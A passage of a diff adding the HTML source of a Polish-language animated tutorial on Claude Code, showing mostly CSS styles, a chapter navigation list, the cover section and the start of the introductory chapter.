@@ -1,0 +1,2715 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Claude Code od zera do eksperta — animowany przewodnik w stylu Head First</title>
+<meta name="description" content="Animowany przewodnik w stylu Head First po Claude Code: pętla agenta, okno kontekstu, pamięć CLAUDE.md, tryby uprawnień, plan mode, prompting, checkpointy, skille, subagenci, hooki, MCP, pluginy, sesje równoległe, worktrees, headless CI, modele i poziom wysiłku, anty-wzorce, quiz i ściągawka.">
+<script>document.documentElement.classList.add('js')</script>
+<style>
+:root {
+  color-scheme: light dark;
+  --paper:#fbf8f1; --paper2:#ffffff; --ink:#1c1c22; --mut:#5d5f6b; --line:#d9d3c4; --shadow:#1c1c22;
+  --accent:#1b6fa8; --accent2:#e39b2d; --ok:#2f9e63; --bad:#d64545; --warn:#c98a00;
+  --pen:#b8431f; --note:#fff4c2; --card:#f1ece0; --code:#f3efe6; --dim:#9aa0ab;
+  --hand:"Segoe Print","Bradley Hand","Comic Neue","Comic Sans MS","Chalkboard SE","Marker Felt",cursive;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  --serif:Charter,"Bitstream Charter","Iowan Old Style",Georgia,"Palatino Linotype",serif;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root { --paper:#15171c; --paper2:#1d2027; --ink:#e7e5df; --mut:#a3a6b1; --line:#383c49; --shadow:#000;
+          --accent:#5aa9e6; --accent2:#f0b34f; --ok:#4cc38a; --bad:#f06b6b; --warn:#f0c040;
+          --pen:#ff9a6b; --note:#3a3420; --card:#232730; --code:#22262e; --dim:#5d6270; }
+}
+* { box-sizing:border-box; }
+[hidden] { display:none !important; }
+html { scroll-behavior:smooth; }
+body { margin:0; background:var(--paper); color:var(--ink); font:18px/1.68 var(--serif); }
+a { color:var(--accent); }
+code, kbd { font:.86em var(--mono); background:var(--code); padding:.08em .35em; border-radius:4px; }
+pre { font:14px/1.5 var(--mono); background:var(--code); border-left:4px solid var(--accent); padding:.9rem 1rem; overflow:auto; border-radius:4px; }
+pre code { background:none; padding:0; font-size:inherit; }
+h1,h2,h3,h4 { font-family:var(--sans); line-height:1.2; }
+h3 { font-size:1.28rem; margin:2.2rem 0 .6rem; }
+strong, b { font-weight:700; }
+.hand { font-family:var(--hand); color:var(--pen); }
+.mut { color:var(--mut); }
+
+/* progress + toc */
+#progress { position:fixed; inset:0 0 auto 0; height:5px; background:linear-gradient(90deg,var(--accent),var(--accent2)); transform-origin:0 50%; transform:scaleX(0); z-index:50; }
+#toc { position:fixed; top:1.4rem; left:1rem; width:205px; font:13.5px/1.35 var(--sans); z-index:40; display:none; opacity:0; pointer-events:none; transition:opacity .4s; }
+body.past-cover #toc { opacity:1; pointer-events:auto; }
+#toc b { display:block; font-size:.78rem; letter-spacing:.08em; text-transform:uppercase; color:var(--mut); margin-bottom:.5rem; }
+#toc a { display:block; padding:.28rem .55rem; border-left:3px solid var(--line); color:var(--mut); text-decoration:none; }
+#toc a:hover { color:var(--ink); }
+#toc a.active { border-color:var(--accent2); color:var(--ink); font-weight:700; background:var(--card); }
+@media (min-width:1440px) { #toc { display:block; } }
+
+/* cover */
+.cover { min-height:96vh; display:grid; place-items:center; padding:3rem 1.2rem; position:relative; overflow:hidden;
+         background:radial-gradient(circle at 70% 30%, color-mix(in srgb, var(--accent2) 18%, transparent), transparent 55%), var(--paper); }
+.cover-inner { max-width:1040px; width:100%; display:grid; gap:2rem; grid-template-columns:1fr; align-items:center; }
+@media (min-width:900px) { .cover-inner { grid-template-columns:1.1fr .9fr; } }
+.cover .kicker { font:700 .85rem var(--sans); letter-spacing:.2em; text-transform:uppercase; color:var(--accent); }
+.cover h1 { font-size:clamp(2.4rem,5.6vw,4.2rem); margin:.3rem 0 .6rem; letter-spacing:-.02em; }
+.cover h1 span { display:inline-block; background:var(--ink); color:var(--paper); padding:0 .25em; transform:rotate(-1.5deg); }
+.cover .sub { font-size:1.2rem; color:var(--mut); max-width:34em; }
+.cover .stamp { display:inline-block; margin-top:1.2rem; font:700 1rem var(--hand); color:var(--pen); border:3px solid var(--pen); padding:.3rem .8rem; border-radius:8px; transform:rotate(-4deg); }
+.cover svg { width:100%; max-width:400px; justify-self:center; overflow:visible; }
+.spin { animation:spin 50s linear infinite; transform-origin:200px 200px; }
+.spin-rev { animation:spin 34s linear infinite reverse; transform-origin:200px 200px; }
+@keyframes spin { to { transform:rotate(360deg); } }
+.cover .scroll-hint { position:absolute; bottom:1.2rem; left:50%; transform:translateX(-50%); font:1rem var(--hand); color:var(--mut); animation:bob 1.8s ease-in-out infinite; }
+@keyframes bob { 50% { transform:translate(-50%,8px); } }
+
+/* layout */
+main { max-width:800px; margin:0 auto; padding:0 1.2rem 6rem; }
+.chapter { padding-top:4.5rem; }
+.chap-head { display:flex; gap:1.1rem; align-items:center; margin-bottom:1rem; }
+.chap-num { flex:none; width:4.2rem; height:4.2rem; border-radius:50%; background:var(--ink); color:var(--paper); display:grid; place-items:center; font:800 1.7rem var(--sans); transform:rotate(-6deg); box-shadow:4px 4px 0 var(--accent2); }
+.chap-head h2 { font-size:clamp(1.6rem,3.8vw,2.2rem); margin:0; }
+.chap-head .tag { font:1.02rem var(--hand); color:var(--pen); display:block; margin-top:.3rem; }
+
+/* reveal */
+.js .reveal { opacity:0; transform:translateY(26px); transition:opacity .7s ease, transform .7s ease; }
+.js .reveal.shown { opacity:1; transform:none; }
+
+/* head-first boxes */
+.box { position:relative; margin:2rem 0; padding:1.1rem 1.25rem 1rem; border:2px solid var(--ink); border-radius:6px; background:var(--paper2); box-shadow:5px 5px 0 var(--shadow); }
+.box > .lbl { position:absolute; top:-1rem; left:1rem; font:800 .82rem var(--sans); letter-spacing:.06em; text-transform:uppercase; background:var(--ink); color:var(--paper); padding:.25rem .65rem; border-radius:4px; transform:rotate(-2deg); }
+.box.brain { border-style:dashed; background:color-mix(in srgb, var(--accent) 8%, var(--paper2)); }
+.box.brain > .lbl { background:var(--accent); color:#fff; }
+.box.pencil { background:color-mix(in srgb, var(--accent2) 10%, var(--paper2)); }
+.box.pencil > .lbl { background:var(--accent2); color:#1c1c22; }
+.box.watch { border-color:var(--bad); box-shadow:5px 5px 0 var(--bad); }
+.box.watch > .lbl { background:var(--bad); color:#fff; }
+.box.geek { background:var(--card); font-size:.95em; }
+.box.geek > .lbl { background:var(--mut); }
+.box.relax { border-color:var(--ok); box-shadow:5px 5px 0 var(--ok); }
+.box.relax > .lbl { background:var(--ok); color:#fff; }
+.box.bullets { background:var(--note); transform:rotate(-.4deg); }
+.box.bullets ul { margin:.3rem 0 0; padding-left:1.2rem; }
+.box.bullets li { margin:.35rem 0; }
+.box.bullets li::marker { content:"▸ "; color:var(--pen); }
+.box.usecase { border-color:var(--accent); box-shadow:5px 5px 0 var(--accent); }
+.box.usecase > .lbl { background:var(--accent); color:#fff; }
+.box.usecase ol { margin:.5rem 0 .3rem; padding-left:1.3rem; }
+.box.usecase li { margin:.4rem 0; }
+.box p:first-of-type { margin-top:.4rem; }
+.box p:last-child { margin-bottom:0; }
+.qa { display:grid; grid-template-columns:auto 1fr; gap:.4rem .8rem; margin:.8rem 0 1rem; }
+.qa .q, .qa .a { font:800 1.15rem var(--sans); }
+.qa .q { color:var(--accent); } .qa .a { color:var(--pen); }
+.qa div { margin:0; }
+details { margin-top:.8rem; }
+summary { cursor:pointer; font:700 .95rem var(--sans); color:var(--pen); }
+.fire { display:grid; gap:.7rem; margin-top:.5rem; }
+.fire .who { font:800 .85rem var(--sans); text-transform:uppercase; letter-spacing:.05em; }
+.fire .line { display:grid; grid-template-columns:7.5rem 1fr; gap:.8rem; }
+.fire .line.l2 .who { color:var(--accent); } .fire .line.l1 .who { color:var(--pen); }
+@media (max-width:560px) { .fire .line { grid-template-columns:1fr; gap:.1rem; } }
+.anno { font:1.05rem/1.35 var(--hand); color:var(--pen); display:block; margin:.4rem 0 .4rem 1.2rem; transform:rotate(-1.2deg); }
+.anno::before { content:"↖ "; }
+.pull { font:italic 1.35rem/1.45 var(--serif); border-left:6px solid var(--accent2); padding:.2rem 0 .2rem 1rem; margin:1.6rem 0; }
+.prompt-ex { font:13.5px/1.5 var(--mono); background:var(--code); border:1.5px dashed var(--line); border-radius:6px; padding:.7rem .85rem; margin-top:.7rem; white-space:pre-wrap; }
+.prompt-ex b { font-family:var(--sans); color:var(--pen); display:block; font-size:11px; text-transform:uppercase; letter-spacing:.05em; margin-bottom:.3rem; }
+
+/* figures (generic) */
+.fig { margin:2.2rem -1rem; padding:1rem 1rem .9rem; background:var(--paper2); border:2px solid var(--ink); border-radius:8px; box-shadow:6px 6px 0 var(--shadow); position:relative; }
+@media (min-width:1000px) { .fig.wide { margin-left:-6rem; margin-right:-6rem; } }
+.fig .ftitle { font:800 .95rem var(--sans); margin:0 0 .6rem; display:flex; gap:.5rem; align-items:baseline; flex-wrap:wrap; }
+.fig .ftitle span { font:400 .85rem var(--sans); color:var(--mut); }
+.fig figcaption, .fig .cap { font:14px/1.45 var(--sans); color:var(--mut); margin-top:.6rem; }
+.fig svg { display:block; width:100%; height:auto; }
+.fig svg text { fill:var(--ink); font-family:var(--sans); }
+.ctrl { display:flex; gap:.5rem; flex-wrap:wrap; align-items:center; margin:.4rem 0 .6rem; font:14px var(--sans); }
+.btn { font:700 13.5px var(--sans); color:var(--ink); background:var(--paper2); border:2px solid var(--ink); border-radius:999px; padding:.33rem .85rem; box-shadow:2px 2px 0 var(--shadow); cursor:pointer; transition:transform .08s; }
+.btn:hover { background:var(--card); }
+.btn:active { transform:translate(2px,2px); box-shadow:none; }
+.btn.primary { background:var(--accent); border-color:var(--accent); color:#fff; }
+.btn.bad { background:var(--bad); border-color:var(--bad); color:#fff; }
+.btn.on { background:var(--ink); color:var(--paper); }
+.btn:disabled { opacity:.45; cursor:not-allowed; }
+.ctrl input[type=text], .ctrl select, .calc input { font:14px var(--mono); padding:.3rem .5rem; border:2px solid var(--ink); border-radius:6px; background:var(--paper); color:var(--ink); }
+.ctrl input[type=text] { width:9rem; }
+.ctrl label { display:inline-flex; gap:.35rem; align-items:center; }
+.scroll-x { overflow-x:auto; }
+.scroll-x > svg { min-width:620px; }
+.two { display:grid; grid-template-columns:1fr; gap:1rem; }
+@media (min-width:720px) { .two { grid-template-columns:1.2fr 1fr; align-items:start; } }
+table.mini { width:100%; border-collapse:collapse; font:13.5px var(--sans); }
+table.mini th, table.mini td { text-align:left; padding:.28rem .4rem; border-bottom:1px solid var(--line); }
+table.mini th { font-size:.75rem; text-transform:uppercase; letter-spacing:.05em; color:var(--mut); }
+table.mini tr.flash td { animation:flashbg 1.2s ease; }
+@keyframes flashbg { 0%{ background:color-mix(in srgb, var(--accent2) 45%, transparent);} 100%{ background:transparent;} }
+.chip { display:inline-block; min-width:1.6em; text-align:center; font:800 12px var(--sans); color:#fff; padding:.1rem .4rem; border-radius:999px; }
+.status { font:14px/1.45 var(--sans); padding:.55rem .75rem; border-radius:6px; background:var(--card); margin-top:.5rem; min-height:2.2rem; }
+.status.ok { background:color-mix(in srgb, var(--ok) 16%, var(--paper2)); }
+.status.bad { background:color-mix(in srgb, var(--bad) 16%, var(--paper2)); }
+.status.warn { background:color-mix(in srgb, var(--warn) 20%, var(--paper2)); }
+.fly { pointer-events:none; }
+.small { font-size:11px; }
+.tiny { font-size:9.5px; }
+.edge { stroke:var(--line); stroke-width:2; }
+.nd circle, .nd rect { fill:var(--paper2); stroke:var(--ink); stroke-width:2.2; transition:fill .3s, opacity .3s; }
+.nd text { font-weight:800; font-size:12px; pointer-events:none; }
+.nd.off circle, .nd.off rect { fill:var(--dim); opacity:.5; stroke-dasharray:4 3; }
+.nd.hot circle, .nd.hot rect { fill:var(--accent2); }
+.nd.pulse circle, .nd.pulse rect, .pop { animation:pulse .6s ease; transform-box:fill-box; transform-origin:center; }
+@keyframes pulse { 40% { transform:scale(1.3); } }
+
+
+/* ================= Przewodnik po Claude Code: style poszczególnych rysunków ================= */
+.kbd-row { display:flex; flex-wrap:wrap; gap:.35rem; margin:.4rem 0; }
+kbd { border:1.5px solid var(--line); border-bottom-width:3px; }
+.lvl { display:inline-block; font:800 11px var(--sans); letter-spacing:.06em; text-transform:uppercase; padding:.1rem .5rem; border-radius:999px; background:var(--accent2); color:#1c1c22; vertical-align:middle; margin-left:.4rem; }
+.meter { height:12px; border-radius:999px; background:var(--card); border:1.5px solid var(--line); overflow:hidden; }
+.meter > i { display:block; height:100%; width:0; background:var(--ok); transition:width .6s ease, background .4s; }
+.legend { display:flex; flex-wrap:wrap; gap:.3rem .9rem; font:12px var(--sans); color:var(--mut); margin-top:.4rem; }
+.legend span::before { content:""; display:inline-block; width:10px; height:10px; border-radius:2px; margin-right:.3rem; background:var(--c); vertical-align:-1px; }
+
+.two > * { min-width:0; }
+.ctrl label { flex-wrap:wrap; max-width:100%; }
+.ctrl select { max-width:100%; min-width:0; }
+.tree { overflow:hidden; }
+
+/* 1: loop */
+.loop-side { font:13px/1.45 var(--sans); }
+.loop-side .ctr { display:flex; gap:.6rem; flex-wrap:wrap; margin-bottom:.5rem; }
+.loop-side .ctr div { background:var(--card); border-radius:6px; padding:.3rem .6rem; }
+.loop-side .ctr b { font-size:1.15rem; display:block; }
+.log { font:12px/1.45 var(--mono); background:var(--code); border-radius:6px; padding:.5rem .6rem; height:190px; overflow-y:auto; }
+.log div { opacity:0; transform:translateX(-6px); transition:opacity .3s, transform .3s; white-space:pre-wrap; }
+.log div.shown { opacity:1; transform:none; }
+.log .u { color:var(--accent); font-weight:700; }
+.log .e { color:var(--bad); }
+.log .g { color:var(--ok); }
+
+/* 2: terminal */
+.term { background:#1b1d23; color:#e7e5df; border-radius:8px; padding:.7rem .8rem .5rem; font:13px/1.5 var(--mono); min-height:250px; display:flex; flex-direction:column; }
+.term .out { flex:1; overflow-y:auto; max-height:230px; }
+.term .out div { white-space:pre-wrap; word-break:break-word; }
+.term .c-acc { color:#5aa9e6; } .term .c-or { color:#f0b34f; } .term .c-ok { color:#4cc38a; } .term .c-mut { color:#8b8f9a; } .term .c-bad { color:#f06b6b; }
+.term .inp { border:1.5px solid #4a4e5a; border-radius:6px; padding:.3rem .5rem; margin-top:.4rem; min-height:1.9rem; }
+.term .inp .cur { display:inline-block; width:.55em; height:1em; background:#e7e5df; vertical-align:-2px; animation:blink 1s steps(1) infinite; }
+@keyframes blink { 50% { opacity:0; } }
+.term .bar { display:flex; justify-content:space-between; gap:.5rem; font-size:11.5px; color:#8b8f9a; margin-top:.3rem; flex-wrap:wrap; }
+.term .mode { color:#f0b34f; font-weight:700; }
+.term .menu { border:1px solid #4a4e5a; border-radius:6px; margin:.3rem 0; padding:.2rem .4rem; font-size:12px; }
+.term .menu div.sel { background:#2d3240; }
+
+/* 3: context */
+.ctx-wrap { display:grid; gap:.7rem; }
+.ctx-row { display:grid; grid-template-columns:6.5rem 1fr; gap:.6rem; align-items:center; font:12.5px var(--sans); }
+.ctx-bar { position:relative; height:34px; border:2px solid var(--ink); border-radius:6px; overflow:hidden; background:var(--paper); display:flex; }
+.ctx-bar .seg { height:100%; transition:width .7s ease; position:relative; overflow:hidden; white-space:nowrap; font:700 10.5px/34px var(--sans); color:#fff; text-indent:4px; }
+.ctx-bar .limit { position:absolute; top:0; bottom:0; width:0; border-left:2px dashed var(--bad); }
+.ctx-bar.sub { height:22px; }
+.ctx-bar.sub .seg { line-height:22px; }
+.ctx-num { font:800 13px var(--sans); }
+.bubble { display:inline-block; font:12.5px var(--sans); background:var(--note); border:1.5px dashed var(--pen); border-radius:10px; padding:.3rem .6rem; transition:opacity .5s; }
+
+/* 4: memory tree */
+.tree { font:12.5px/1.25 var(--mono); }
+.tree div { padding:.22rem .4rem; border-radius:5px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; transition:background .4s, color .4s; }
+.tree div.dir { color:var(--mut); }
+.tree div.md { cursor:default; }
+.tree div.on { background:color-mix(in srgb, var(--ok) 22%, transparent); font-weight:700; }
+.tree div.touch { background:color-mix(in srgb, var(--accent2) 30%, transparent); }
+.tree small { font-family:var(--sans); color:var(--mut); font-weight:400; }
+.loaded { font:12.5px/1.4 var(--sans); }
+.loaded .it { border:1.5px solid var(--line); border-left:5px solid var(--ok); border-radius:5px; padding:.25rem .45rem; margin:.3rem 0; opacity:0; transform:translateY(6px); transition:opacity .35s, transform .35s; background:var(--paper2); }
+.loaded .it.shown { opacity:1; transform:none; }
+.loaded .it i { font-style:normal; color:var(--mut); font-size:11px; display:block; }
+
+/* 5: permissions */
+.modes { display:flex; gap:.35rem; flex-wrap:wrap; margin-bottom:.5rem; }
+.modes span { font:700 12px var(--mono); padding:.2rem .55rem; border:2px solid var(--line); border-radius:999px; color:var(--mut); transition:all .3s; }
+.modes span.on { border-color:var(--accent2); background:var(--accent2); color:#1c1c22; }
+.modes span.opt { border-style:dashed; }
+.rules { display:grid; grid-template-columns:repeat(3,1fr); gap:.5rem; font:12px var(--mono); }
+@media (max-width:560px) { .rules { grid-template-columns:1fr; } }
+.rule-col { border:2px solid var(--line); border-radius:8px; padding:.4rem .5rem; transition:border-color .3s, background .3s; }
+.rule-col h5 { margin:0 0 .3rem; font:800 11px var(--sans); text-transform:uppercase; letter-spacing:.06em; }
+.rule-col.deny h5 { color:var(--bad); } .rule-col.ask h5 { color:var(--warn); } .rule-col.allow h5 { color:var(--ok); }
+.rule-col div { padding:.1rem .25rem; border-radius:4px; transition:background .3s; }
+.rule-col.scan { border-color:var(--accent); background:color-mix(in srgb, var(--accent) 8%, transparent); }
+.rule-col div.hit { background:var(--accent2); color:#1c1c22; font-weight:700; }
+.calls { display:flex; flex-wrap:wrap; gap:.35rem; margin:.5rem 0; }
+.calls button { font:12px var(--mono); padding:.25rem .55rem; border:1.5px solid var(--ink); border-radius:6px; background:var(--paper); color:var(--ink); cursor:pointer; }
+.calls button.on { background:var(--ink); color:var(--paper); }
+.verdict { font:800 1rem var(--sans); }
+
+/* 6: plan race */
+.lane { display:grid; grid-template-columns:8.5rem 1fr 4.2rem; gap:.5rem; align-items:center; margin:.5rem 0; font:12.5px var(--sans); }
+@media (max-width:560px) { .lane { grid-template-columns:1fr 3.6rem; } .lane > b { grid-column:1 / -1; } }
+.track { position:relative; height:30px; background:var(--card); border-radius:6px; overflow:hidden; display:flex; }
+.track .blk { height:100%; font:700 10.5px/30px var(--sans); color:#fff; text-align:center; overflow:hidden; white-space:nowrap; transition:width .45s linear; width:0; }
+.lane .t { font:800 13px var(--mono); text-align:right; }
+
+/* 7: prompt builder */
+.ingr { display:grid; gap:.3rem; font:13px var(--sans); }
+.ingr label { display:flex; gap:.45rem; align-items:flex-start; cursor:pointer; }
+.ingr input { margin-top:.25rem; }
+.pbox { font:12.5px/1.55 var(--mono); background:var(--code); border:1.5px dashed var(--line); border-radius:6px; padding:.6rem .7rem; min-height:120px; white-space:pre-wrap; }
+.pbox .add { background:color-mix(in srgb, var(--ok) 22%, transparent); border-radius:3px; }
+.guess { font:12.5px var(--sans); margin-top:.5rem; }
+.guess li { transition:opacity .4s, text-decoration-color .4s; }
+.guess li.done { opacity:.4; text-decoration:line-through; }
+
+/* 8: rewind */
+.tl { display:flex; gap:.35rem; align-items:stretch; flex-wrap:wrap; margin:.3rem 0 .6rem; }
+.tl .p { flex:1; min-width:120px; border:2px solid var(--line); border-radius:8px; padding:.35rem .45rem; font:12px/1.35 var(--sans); background:var(--paper); transition:opacity .4s, border-color .3s; position:relative; }
+.tl .p b { font-family:var(--mono); }
+.tl .p.run { border-color:var(--accent); }
+.tl .p.gone { opacity:.3; text-decoration:line-through; }
+.tl .p .ck { position:absolute; top:-8px; left:-8px; width:16px; height:16px; border-radius:50%; background:var(--accent2); border:2px solid var(--ink); }
+.files { display:grid; grid-template-columns:repeat(3,1fr); gap:.5rem; }
+.file { border:2px solid var(--ink); border-radius:6px; padding:.4rem .5rem; font:12px/1.4 var(--mono); background:var(--paper2); transition:background .4s, opacity .4s; min-height:74px; }
+.file b { display:block; font-family:var(--sans); }
+.file.chg { background:color-mix(in srgb, var(--accent2) 24%, var(--paper2)); }
+.file.del { opacity:.35; border-style:dashed; }
+.file.bad { background:color-mix(in srgb, var(--bad) 18%, var(--paper2)); }
+
+/* 9: skills */
+.shelf { display:grid; grid-template-columns:repeat(auto-fit,minmax(170px,1fr)); gap:.5rem; }
+.skill { border:2px solid var(--ink); border-radius:8px; padding:.45rem .55rem; font:12px/1.4 var(--sans); background:var(--paper2); transition:background .4s, border-color .4s, box-shadow .4s; }
+.skill code { font-size:11px; }
+.skill .nm { font:800 13px var(--mono); }
+.skill .fm { color:var(--mut); font:11px var(--mono); margin-top:.2rem; }
+.skill.hidden-model { border-style:dashed; }
+.skill.active { border-color:var(--accent2); box-shadow:4px 4px 0 var(--accent2); background:color-mix(in srgb, var(--accent2) 12%, var(--paper2)); }
+.skill.forked { border-color:var(--accent); box-shadow:4px 4px 0 var(--accent); }
+
+/* 10: subagents */
+.sub-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:.5rem; margin-top:.6rem; }
+@media (max-width:560px) { .sub-grid { grid-template-columns:1fr; } }
+.subag { border:2px dashed var(--line); border-radius:8px; padding:.4rem .5rem; font:12px var(--sans); transition:border-color .4s, opacity .4s; opacity:.45; }
+.subag.live { border-color:var(--accent); border-style:solid; opacity:1; }
+.subag .fn { font:11px var(--mono); color:var(--mut); height:3.2em; overflow:hidden; }
+
+/* 11: hooks */
+.evs { display:grid; grid-template-columns:repeat(7,1fr); gap:.3rem; }
+@media (max-width:700px) { .evs { grid-template-columns:repeat(4,1fr); } }
+.ev { border:2px solid var(--line); border-radius:8px; padding:.35rem .3rem; text-align:center; font:700 10.5px/1.25 var(--mono); transition:background .3s, border-color .3s, transform .3s; min-height:52px; display:grid; place-items:center; position:relative; word-break:normal; overflow-wrap:normal; }
+.ev.fire { border-color:var(--accent2); background:color-mix(in srgb, var(--accent2) 30%, transparent); transform:translateY(-3px); }
+.ev.hooked::after { content:"🪝"; position:absolute; top:-9px; right:-4px; font-size:13px; }
+.ev.tool { border-style:dashed; font-family:var(--sans); }
+.hook-tg { display:grid; gap:.3rem; font:12.5px var(--sans); margin:.5rem 0; }
+.hook-tg label { display:flex; gap:.4rem; align-items:flex-start; cursor:pointer; }
+.hook-tg code { font-size:11px; }
+
+/* 12: mcp */
+.mcp-side { font:12.5px/1.45 var(--sans); }
+.cfg { font:11.5px/1.45 var(--mono); background:var(--code); border-radius:6px; padding:.45rem .55rem; white-space:pre-wrap; min-height:5.2em; }
+.toolnames { display:flex; flex-wrap:wrap; gap:.25rem; margin:.4rem 0; }
+.toolnames span { font:10.5px var(--mono); padding:.08rem .35rem; border-radius:4px; background:var(--card); border:1px solid var(--line); transition:background .4s; }
+.toolnames span.full { background:var(--accent2); color:#1c1c22; font-weight:700; }
+
+/* 13: parallel chooser */
+.scen { display:grid; gap:.35rem; }
+.scen button { text-align:left; font:13px/1.35 var(--sans); padding:.45rem .6rem; border:2px solid var(--line); border-radius:8px; background:var(--paper); color:var(--ink); cursor:pointer; }
+.scen button.on { border-color:var(--accent); background:color-mix(in srgb, var(--accent) 12%, var(--paper)); }
+.appr { display:grid; grid-template-columns:repeat(auto-fit,minmax(118px,1fr)); gap:.4rem; margin-top:.6rem; }
+.appr div { border:2px solid var(--line); border-radius:8px; padding:.35rem .4rem; font:11.5px/1.3 var(--sans); transition:all .35s; opacity:.55; }
+.appr div b { display:block; font:800 12px var(--mono); }
+.appr div.win { opacity:1; border-color:var(--accent2); box-shadow:3px 3px 0 var(--accent2); transform:translateY(-2px); }
+
+/* 14: CI */
+.ci { display:grid; gap:.5rem; }
+.ci .stage { border:2px solid var(--line); border-radius:8px; padding:.4rem .55rem; font:12.5px/1.45 var(--sans); transition:border-color .3s; }
+.ci .stage.act { border-color:var(--accent); }
+.ci .stage pre { margin:.3rem 0 0; font-size:11.5px; white-space:pre-wrap; }
+.ci .tcall { font:11.5px var(--mono); margin:.15rem 0; opacity:0; transition:opacity .3s; }
+.ci .tcall.shown { opacity:1; }
+
+/* 15: models */
+.mtab { width:100%; border-collapse:collapse; font:12.5px var(--sans); }
+.mtab td { padding:.3rem .35rem; border-bottom:1px solid var(--line); vertical-align:middle; }
+.mtab td:first-child { width:7.5rem; font-weight:700; }
+.hbar { height:14px; border-radius:4px; background:var(--accent); transition:width .6s ease; width:0; }
+.hbar.b2 { background:var(--accent2); } .hbar.b3 { background:var(--ok); }
+
+/* 16: ladder */
+.ladder { display:grid; gap:.35rem; }
+.rung { border:2px solid var(--line); border-radius:8px; padding:.4rem .6rem; font:12.5px/1.4 var(--sans); transition:border-color .35s, background .35s; }
+.rung.reached { border-color:var(--ok); background:color-mix(in srgb, var(--ok) 12%, var(--paper2)); }
+.rung.next { border-color:var(--accent2); background:color-mix(in srgb, var(--accent2) 14%, var(--paper2)); }
+.rung b { font-family:var(--sans); }
+.habits { display:grid; gap:.25rem; font:12.5px var(--sans); }
+.habits label { display:flex; gap:.4rem; cursor:pointer; align-items:flex-start; }
+.habits input { margin-top:.22rem; }
+.pat { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:.4rem; margin:.5rem 0; }
+.pat button { font:700 12.5px var(--sans); padding:.5rem; border:2px solid var(--bad); border-radius:8px; background:var(--paper); color:var(--ink); cursor:pointer; text-align:left; }
+.pat button.on { background:var(--bad); color:#fff; }
+/* quiz */
+.quiz-q { margin:1.2rem 0; padding:.9rem 1rem; border:2px solid var(--ink); border-radius:8px; background:var(--paper2); }
+.quiz-q h4 { margin:0 0 .6rem; font-size:1rem; }
+.quiz-q .opts { display:grid; gap:.4rem; }
+.quiz-q button { text-align:left; font:14px/1.4 var(--sans); color:var(--ink); background:var(--paper); border:2px solid var(--line); border-radius:6px; padding:.45rem .7rem; cursor:pointer; }
+.quiz-q button:hover:not(:disabled) { border-color:var(--ink); }
+.quiz-q button.right { border-color:var(--ok); background:color-mix(in srgb, var(--ok) 18%, var(--paper2)); }
+.quiz-q button.wrong { border-color:var(--bad); background:color-mix(in srgb, var(--bad) 15%, var(--paper2)); }
+.quiz-q .why { font:14px/1.45 var(--sans); color:var(--mut); margin-top:.5rem; display:none; }
+.quiz-q.done .why { display:block; }
+.score { position:sticky; bottom:1rem; margin-left:auto; width:max-content; font:800 1rem var(--sans); background:var(--ink); color:var(--paper); padding:.45rem .9rem; border-radius:999px; box-shadow:3px 3px 0 var(--accent2); }
+.cheat td:first-child { font-family:var(--mono); font-size:12.5px; white-space:nowrap; }
+footer { max-width:800px; margin:0 auto; padding:2rem 1.2rem 4rem; font:14px var(--sans); color:var(--mut); border-top:2px solid var(--line); }
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation-duration:.001s !important; animation-iteration-count:1 !important; transition-duration:.001s !important; }
+  html { scroll-behavior:auto; }
+}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+
+<nav id="toc" aria-label="Rozdziały">
+  <b>Spis treści</b>
+  <a href="#intro">0 · Jak czytać ten przewodnik</a>
+  <a href="#loop">1 · Pętla agenta</a>
+  <a href="#term">2 · Pierwsza sesja</a>
+  <a href="#ctx">3 · Okno kontekstu</a>
+  <a href="#mem">4 · Pamięć</a>
+  <a href="#perm">5 · Uprawnienia</a>
+  <a href="#plan">6 · Najpierw plan</a>
+  <a href="#prompt">7 · Prompting</a>
+  <a href="#rewind">8 · Sesje i cofanie</a>
+  <a href="#skills">9 · Skille</a>
+  <a href="#sub">10 · Subagenci</a>
+  <a href="#hooks">11 · Hooki</a>
+  <a href="#mcp">12 · MCP i pluginy</a>
+  <a href="#par">13 · Praca równoległa</a>
+  <a href="#ci">14 · Headless i CI</a>
+  <a href="#model">15 · Modele i koszt</a>
+  <a href="#expert">16 · Nawyki eksperta</a>
+  <a href="#final">17 · Egzamin + ściągawka</a>
+</nav>
+
+<header class="cover">
+  <div class="cover-inner">
+    <div>
+      <div class="kicker">Animowany przewodnik · Claude Code od zera do eksperta</div>
+      <h1>Claude Code <span>od środka</span></h1>
+      <p class="sub">Co naprawdę dzieje się między Twoim promptem a zielonym zestawem testów: pętla, okno kontekstu,
+        pamięć, tryby uprawnień, skille, subagenci, hooki, MCP, sesje równoległe i CI. Każda opcja, kiedy jej użyć,
+        i przepływy pracy, które naprawdę stosują eksperci. Przewijaj — diagramy startują same.</p>
+      <div class="stamp">Twój mózg na agentach 🧠</div>
+    </div>
+    <svg viewBox="0 0 400 400" aria-hidden="true">
+      <g class="spin">
+        <circle cx="200" cy="200" r="150" fill="none" stroke="var(--line)" stroke-width="4"/>
+        <g id="cover-nodes"></g>
+      </g>
+      <g class="spin-rev">
+        <circle cx="200" cy="200" r="95" fill="none" stroke="var(--accent2)" stroke-width="2" stroke-dasharray="4 10"/>
+      </g>
+      <rect x="130" y="150" width="140" height="100" rx="12" fill="#1b1d23" stroke="var(--ink)" stroke-width="4"/>
+      <text x="148" y="190" fill="#f0b34f" font-family="ui-monospace,Menlo,monospace" font-size="26" font-weight="700">&gt;_</text>
+      <rect id="cover-cursor" x="190" y="172" width="12" height="22" fill="#e7e5df"/>
+      <text x="148" y="228" fill="#4cc38a" font-family="ui-monospace,Menlo,monospace" font-size="13">✓ testy przechodzą</text>
+    </svg>
+  </div>
+  <div class="scroll-hint">przewiń ↓</div>
+</header>
+
+<main>
+
+<!-- ============================ 0 ============================ -->
+<section class="chapter" id="intro">
+  <div class="chap-head reveal"><div class="chap-num">0</div><div><h2>Jak czytać ten przewodnik</h2><span class="tag">…i skąd żarty, suwaki i fałszywy terminal</span></div></div>
+
